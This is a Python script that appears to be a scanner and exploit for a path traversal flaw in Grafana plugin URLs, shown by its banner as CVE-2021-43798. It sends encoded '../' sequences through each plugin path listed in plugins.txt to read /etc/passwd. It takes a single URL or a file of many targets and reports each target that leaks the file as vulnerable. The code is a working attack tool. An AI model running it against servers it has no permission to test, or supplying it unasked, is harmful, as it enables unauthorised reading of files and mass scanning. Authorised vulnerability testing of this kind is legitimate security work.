import argparse
import requests


def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
grafana任意文件读取校验！
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    args = parser.parse_args()
    if args.file is None and args.url is None:
        print(parser.print_help())
        exit()
    else:
        return args

def attack(url):
    print("[+]trying attack")
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    with open("plugins.txt", 'r') as f:
        for plugins in f.readlines():
            realurl = url + '/public/plugins/'+str.rstrip(plugins)+'/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd'
            try:
                res = requests.get(url=realurl)
                if 'root:x:0:0:root' in res.text:
                    print("[+]"+url+' '+'存在'+str.rstrip(plugins)+'插件,并存在漏洞!')
                else:
                    print("[-]"+url+' '+'不存在'+str.rstrip(plugins)+'插件')
            except Exception as e:
                print("[-]请求错误！")


def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[:-1]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list
def main():
    img = """
  _______      ________    ___   ___ ___  __        _  _  ____ ______ ___   ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |      | || ||___ \____  / _ \ / _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) || |______| || |_ __) |  / / (_) | (_) |
| |      \ \/ / |  __|______/ /| | | |/ / | |______|__   _|__ <  / / \__, |> _ < 
| |____   \  /  | |____    / /_| |_| / /_ | |         | | ___) |/ /    / /| (_) |
 \_____|   \/   |______|  |____|\___/____||_|         |_||____//_/    /_/  \___/ 

    """
    print(img)
    args = Args()
    if args.file is None and args.url is not None:
        attack(args.url)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i)
if __name__ =="__main__":
    main()

